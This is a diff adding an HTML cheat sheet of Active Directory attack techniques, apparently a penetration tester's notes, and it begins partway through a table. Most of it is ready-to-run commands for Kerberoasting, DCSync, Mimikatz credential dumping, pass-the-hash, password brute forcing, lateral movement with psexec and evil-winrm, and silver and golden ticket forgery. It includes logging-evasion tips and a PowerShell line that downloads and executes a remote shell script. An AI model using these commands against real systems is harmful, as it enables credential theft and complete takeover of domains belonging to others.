+                            <td>Tells if the account is disabled or not</td>
+                        </tr>
+                        <tr>
+                            <td>-history</td>
+                            <td>Windows will show the last 24 used passwords for each user</td>
+                        </tr>
+                    </table>
+                </ul>
+
+                <li>Grep the ntds dump</li>
+                <ul>
+                    <li>grep -v &apos;aes[12]\|des-cbc</li>
+                    <li>grep -v history0</li>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>Brute force valid users amd pre-auth attack</li>
+    <ul>
+        <li>kerbrute</li>
+        <ul>
+            <li>pre-auth attack tool. Will validate user existence.</li>
+            <li>Can lock out users but will not generate 4625 event code which is logged by default. The event code it
+                does generate is not logged by default.</li>
+            <li>kerberute userenum --dc apt -d &lt;domain&gt; &lt;user list&gt;</li>
+        </ul>
+    </ul>
+
+    <li>Kerberoast</li>
+    <ul>
+        <li>Mimikatz/manual</li>
+        <table>
+            <tr>
+                <td>Purge all current tickets</td>
+                <td>kerberos::purge</td>
+            </tr>
+            <tr>
+                <td>Enumerate SPNs</td>
+                <td>GetUserSPNs.ps1</td>
+            </tr>
+            <tr>
+                <td>Request security token for SPN</td>
+                <td>
+                    <li>Add-Type -AssemblyName System.IdentityModel</li>
+                    <li>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList
+                        &#039;&lt;SPN - Example:HTTP/CorpWebServer.corp.com&gt;'</li>
+                </td>
+            </tr>
+            <tr>
+                <td>export TGS ticket</td>
+                <td>kereberos::list /export or PS &gt; klist</td>
+            </tr>
+            <tr>
+                <td>Turn output into hashcat hash</td>
+                <td>kirbi2hashcat</td>
+            </tr>
+        </table>
+
+        <li>Rubeus</li>
+        <ul>
+            <li>.\r.exe kerberoast /creduser:domain\&lt;user&gt; /credpassword:&lt;password&gt;</li>
+        </ul>
+
+        <li>GetUserSPNs.py</li>
+        <table>
+            <tr>
+                <td>Forward port 88 & 389 to Kali</td>
+                <td>chisel.exe client 10.10.14.4:8008 R:88:127.0.0.1:88 R:389:localhost:389</td>
+            </tr>
+            <tr>
+                <td>Get hash for kerberoastable users</td>
+                <td>GetUserSPNs.py -request -dc-ip 127.0.0.1 &lt;domain&gt;/&lt;user&gt;</td>
+            </tr>
+        </table>
+    </ul>
+
+    <li>DCSync</li>
+    <ul>
+        <li>Retrieve all domain password data via domain replication protocols.</li>
+        <li>Tools/Methods</li>
+        <ul>
+            <li>Impacket-SecretsDump &#039;&lt;username&gt;:&lt;password&gt;@&lt;ip address&gt;&#039;</li>
+            <ul>
+                <li>Attack remotely. Generates network traffic. Does not have to deal with AV or other problems on
+                    victim machine.</li>
+            </ul>
+            <li>.\Mimikatz.exe 'lsadump::dcsync /domain:&lt;domain name&gt; /user:administrator&#039; exit</li>
+            <ul>
+                <li>Attack locally. Reduced network traffic.</li>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>Brute force credentials with smb and winrm</li>
+    <ul>
+        <li>crackmapexec winrm/smb -u &lt;username&gt; -p &lt;password&gt; or -H &lt;hash&gt;</li>
+        <ul>
+            <li>SMB brute forcing can be detected and banned by some AD setups</li>
+        </ul>
+    </ul>
+
+    <li>Enumerating AD Users and Groups</li>
+    <table>
+        <tr>
+            <td>net user</td>
+            <td>Shows local user accounts</td>
+        </tr>
+        <tr>
+            <td>net user /domain</td>
+            <td>Shows all domain user accounts</td>
+        </tr>
+        <tr>
+            <td>net user &lt;user&gt; /domain</td>
+            <td>Shows all domain user accounts</td>
+        </tr>
+        <tr>
+            <td>net group /domain</td>
+            <td>Shows all groups on the domain</td>
+        </tr>
+    </table>
+
+    <li>Fix clock skew</li>
+    <ul>
+        <li>Check clock skew</li>
+        <ul>
+            <li>nmap</li>
+            <ul>
+                <li>sudo nmap -p445 -sV -sC &lt;ip address&gt;</li>
+                <li>Look for clock-skew: mean: &lt;value&gt; deviation: &lt;clock skew time&gt; median: &lt;value&gt;
+                </li>
+            </ul>
+        </ul>
+
+        <li>Check local time (on Kali)</li>
+        <ul>
+            <li>date</li>
+        </ul>
+
+        <li>Change local time (on Kali)</li>
+        <ul>
+            <li>date -s &lt;Time&gt;</li>
+            <ul>
+                <li>&lt;Time&gt; Format</li>
+                <ul>
+                    <li>HH:MM:SS</li>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>Check domain</li>
+    <ul>
+        <li>crackmapexec smb &lt;ip&gt;</li>
+    </ul>
+
+    <hr>
+
+    <h2>Credential Usage</h2>
+
+    <table>
+        <tr>
+            <td>
+                <li>impacket-psexec</li>
+                <ul>
+                    <li>If user has ability to write to a SMB share</li>
+                </ul>
+                <li>impacket-wmiexec uses same syntax</li>
+                <ul>
+                    <li>wmiexec does not require writing to SMB</li>
+                </ul>
+            </td>
+            <td>
+                <li>impacket-psexec &lt;username&gt;@&lt;ip address&gt; -hashes LM:NTLM</li>
+                <li>impacket-psexec &lt;username&gt;:&lt;password&gt;@&lt;ip address&gt;</li>
+                <li>impacket-psexec &lt;username&gt;@&lt;ip address&gt;</li>
+                <ul>
+                    <li>Will prompt for password. Works when password has bad characters that are throwing off the
+                        command.</li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <li>Run powershell command as other user</li>
+            </td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Method 1</td>
+                        <td>Start-Process -FilePath &quot;powershell&quot; -argumentlist &quot;IEX(New-Object
+                            Net.WebClient).downloadString(&apos;http://&lt;ip address&gt;/shell.ps1&apos;)&quot;
+                            -Credential $cred</td>
+                    </tr>
+                    <tr>
+                        <td>Method 2</td>
+                        <td>Invoke-Command -ComputerName &lt;computer name&gt; -Credential $cred -ScriptBlock {whoami}
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Method 3</td>
+                        <td>
+                            <li>Powershell-Suite/Runas.ps1</li>
+                            <li>Invoke-RunAs -User &lt;username&gt; -Password &lt;password&gt; -LogonType &lt;0x1 or
+                                0x2&gt; -Binary powershell.exe -Args &lt;powershell command&gt;</li>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Pass the hash</td>
+            <td>
+                <li>pth-winexe - Pass the hash</li>
+                <ul>
+                    <li>Used to authenticate via the SMB protocol</li>
+                    <li>Example: pth-winexe &ndash;U &lt;username&gt;%&lt;hash - Must be formatted LM_Hash:NT_Hash&gt;
+                        //&lt;ip address&gt; cmd</li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <li>winexe - password</li>
+            </td>
+            <td>
+                <li>winexe -U &#039;&lt;username&gt;%&lt;password&gt;&#039; //&lt;ip address&gt; cmd.exe</li>
+                <li>winexe -U &#039;&lt;username&gt;%&lt;password&gt;&#039; --system //&lt;ip address&gt; cmd.exe</li>
+            </td>
+        </tr>
+        <tr>
+            <td>evil-winrm</td>
+            <td>
+                <li>evil-winrm -i &lt;ip address&gt; -u &lt;user&gt; -p &lt;password&gt;</li>
+                <li>evil-winrm -i &lt;ip address&gt; -u &lt;user&gt; -H &lt;NTLM&gt;</li>
+            </td>
+        </tr>
+    </table>
+
+    <hr>
+
+    <h2>Overpass the Hash</h2>
+
+    <li>Turn NTLM hash into Kerberos ticket to avoid the use of NTLM authentication</li>
+    <ul>
+        <li>Retrieve NTLM hash for user</li>
+        <ul>
+            <li>Mimikatz</li>
+            <ul>
+                <li>Privilege::debug</li>
+                <li>Sekurlsa::logonpasswords</li>
+            </ul>
+        </ul>
+
+        <li>Authenticate with NTLM hash – Powershell session under context of other user</li>
+        <ul>
+            <li>Mimikatz</li>
+            <ul>
+                <li>Sekurlsa::pth /user:&lt;username&gt; /domain:&lt;domain &ndash; ex. Corp.com&gt; /ntlm:&lt;NTLM
+                    hash&gt; /run:powershell.exe</li>
+            </ul>
+        </ul>
+        <li>Generate TGT by authenticating to a network share on DC – can use any command that requires domain
+            permissions</li>
+        <ul>
+            <li>Net use \\&lt;Domain Controller &ndash; ex. dc01&gt;</li>
+        </ul>
+        <li>Check for cached Kerberos ticket</li>
+        <ul>
+            <li>Klist</li>
+        </ul>
+        <li>Run PsExec inside powershell session that is running under context of other user</li>
+        <ul>
+            <li>.\PsExec.exe \\&lt;domain controller &ndash; ex. dc01&gt; cmd.exe</li>
+        </ul>
+    </ul>
+
+    <hr>
+
+    <h2>Silver Ticket</h2>
+    <li>Forge TGS using a service account password or NTLM hash in order to access any resources that the service
+        account has permissions to</li>
+    <li>If the SPN is used on multiple servers the ticket can be leveraged against them all.</li>
+    <li>Creation Instructions</li>
+    <ul>
+        <li>Get domain SID</li>
+        <ul>
+            <li>Whoami /user</li>
+            <ul>
+                <li>SID is everything except the last section of digits</li>
+            </ul>
+        </ul>
+
+        <li>mimikatz</li>
+        <ul>
+            <li>Get rid of pre-existing kerberos tickets</li>
+            <ul>
+                <li>Kerberos::purge</li>
+            </ul>
+
+            <li>Verify Kerberos tickets are purged</li>
+            <ul>
+                <li>Kerberos::list</li>
+            </ul>
+
+            <li>Forge silver ticket</li>
+            <ul>
+                <li>Kerberos::golden /user:&lt;username&gt; /domain:&lt;domain ex. corp.com&gt; /sid:&lt;domain SID
+                    &ndash; whoami /user SID except last section of #&#039;s&gt; target:&lt;fully qualified host name of
+                    service &ndash; ex. CorpWebServer.corp.com&gt; /service:&lt;service type &ndash; ex. HTTP&gt;
+                    /rc4:&lt;service account hash&gt; /ppt (inject into memory)</li>
+                <ul>
+                    <li>Rc4/hash section requires knowledge of service account password. If password is known, we can
+                        hash it.</li>
+                </ul>
+            </ul>
+        </ul>
+        <li>Verify ticket has been created</li>
+        <ul>
+            <li>Kerberos::list</li>
+        </ul>
+    </ul>
+
+    <hr>
+
+    <h2>Golden Ticket</h2>
+
+    <li>Gives access to anything and everything</li>
+    <li>Requires the password or hash for the service account krbtgt</li>
+    <li>Must have access to an account that is a member of the domain admins group or have access to the domain
+        controller itself.</li>
+    <li>Creating the golden ticket does not require admin privileges and can be performed on a computer not joined to
+        the domain.</li>
+    <li>Creating golden ticket on Linux</li>
+    <ul>
+        <li>Get krbtgt hash</li>
+        <ul>
+            <li>impacket-SecretsDump</li>
+        </ul>
+
+        <li>Get domain SID</li>
+        <ul>
+            <li>On Windows</li>
+            <ul>
+                <li>PS &gt; Get-ADDomain &lt;Domain&gt;</li>
+            </ul>
+        </ul>
+
+        <li>impacket-ticketer</li>
+        <ul>
+            <li>impacket-ticketer -nthash &lt;krbtgt ntlm hash&gt; -domain-sid &lt;domain sid&gt; -domain &lt;Domain
+                Name&gt; &lt;Username&gt;</li>
+        </ul>
+        <li>export KRB5CCNAME=&lt;output .cache file from impacket-ticketer command&gt;</li>
+        <li>psexec &lt;domain&gt;/&lt;username&gt;@&lt;ip address&gt; -k -no-pass</li>
+        <ul>
+            <li>Try adding domain names to /etc/host file before running</li>
+            <ul>
+                <li>Try DNS names instead of ip address in command</li>
+            </ul>
+
+            <li>psexec will always login as SYSTEM</li>
+            <ul>
+                <li>switch to wmiexec to login as Administrator instead of SYSTEM</li>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>Creating the golden ticket on windows</li>
+    <ul>
+        <li>Get domain SID & krbtgt hash</li>
+        <ul>
+            <li>mimikatz: privilege::debug</li>
+            <li>mimikatz: lsadump::lsa /patch</li>
+        </ul>
+
+        <li>Purge kerberos tickets</li>
+        <ul>
+            <li>mimikatz: kerberos::purge</li>
+        </ul>
+
+        <li>Create golden ticket</li>
+        <ul>
+            <li>mimikatz: kerberos::golden /user:fakeuser /domain:corp.com /sid:s-1-5-&lt;sid&gt; /krbtgt:&lt;krbtgt
+                hash /ptt&gt;</li>
+        </ul>
+
+        <li>Launch new command prompt</li>
+        <ul>
+            <li>misc::cmd</li>
+        </ul>
+
+        <li>Attempt lateral movement with psexec</li>
+        <ul>
+            <li>Psexec.exe \\&lt;domain controller&gt; cmd.exe</li>
+        </ul>
+    </ul>
+
+</body>
+
+</html>
